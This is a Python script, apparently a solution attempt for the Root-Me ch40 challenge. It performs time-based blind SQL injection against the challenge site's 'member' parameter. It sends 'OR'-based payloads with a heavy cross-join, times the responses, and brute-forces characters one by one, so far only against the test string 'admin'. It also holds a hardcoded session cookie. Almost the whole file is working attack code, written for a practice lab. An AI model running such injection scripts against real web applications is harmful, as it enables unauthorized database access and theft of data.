#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 40 - PROBAR DIFERENTES MÉTODOS DE EXTRACCIÓN
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.threshold = 35
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold

# ============================================================
# PROBAR DIFERENTES MÉTODOS DE EXTRACCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  PROBANDO DIFERENTES MÉTODOS DE EXTRACCIÓN")
print("="*70)

# 1. Probar diferentes formas de comparar caracteres
print("\n[1] Probando comparaciones de caracteres:")

# Carácter 'a' = 97
tests = [
    ("ASCII('a') = 97", "ASCII('a')"),
    ("ORD('a') = 97", "ORD('a')"),
    ("ASCII(SUBSTRING('admin', 1, 1)) = 97", "ASCII(SUBSTRING)"),
    ("SUBSTRING('admin', 1, 1) = 'a'", "SUBSTRING directo"),
    ("LEFT('admin', 1) = 'a'", "LEFT"),
    ("MID('admin', 1, 1) = 'a'", "MID"),
]

for cond, desc in tests:
    try:
        result = injector.is_true(cond)
        print(f"  {desc:30} -> {result}")
    except:
        print(f"  {desc:30} -> ERROR")

# 2. Probar extracción con diferentes métodos
print("\n[2] Probando extracción con diferentes métodos:")

def extraer_con_metodo(metodo, query, pos):
    """Extrae un carácter usando diferentes métodos"""
    cond = f"{metodo}(({query}), {pos}, 1) = 'a'"
    return injector.is_true(cond)

query = "SELECT 'admin'"
for pos in range(1, 6):
    print(f"\n  Posición {pos}:")
    for metodo in ["ASCII(SUBSTRING", "ORD(SUBSTRING", "SUBSTRING", "LEFT", "MID"]:
        try:
            result = extraer_con_metodo(metodo, query, pos)
            print(f"    {metodo}: {result}")
        except:
            print(f"    {metodo}: ERROR")

# 3. Extraer carácter por carácter con diferentes métodos
print("\n[3] Extrayendo 'admin' con diferentes métodos:")

def extraer_con_comparacion(metodo, query, pos):
    """Extrae un carácter probando todas las letras"""
    for letra in "abcdefghijklmnopqrstuvwxyz":
        cond = f"{metodo}(({query}), {pos}, 1) = '{letra}'"
        if injector.is_true(cond):
            return letra
    return None

for metodo in ["SUBSTRING", "LEFT", "MID"]:
    print(f"\n  Método: {metodo}")
    resultado = ""
    for pos in range(1, 6):
        char = extraer_con_comparacion(metodo, "SELECT 'admin'", pos)
        if char:
            resultado += char
            print(f"    Pos {pos}: '{char}'")
        else:
            print(f"    Pos {pos}: No encontrado")
    print(f"  Resultado: '{resultado}'")
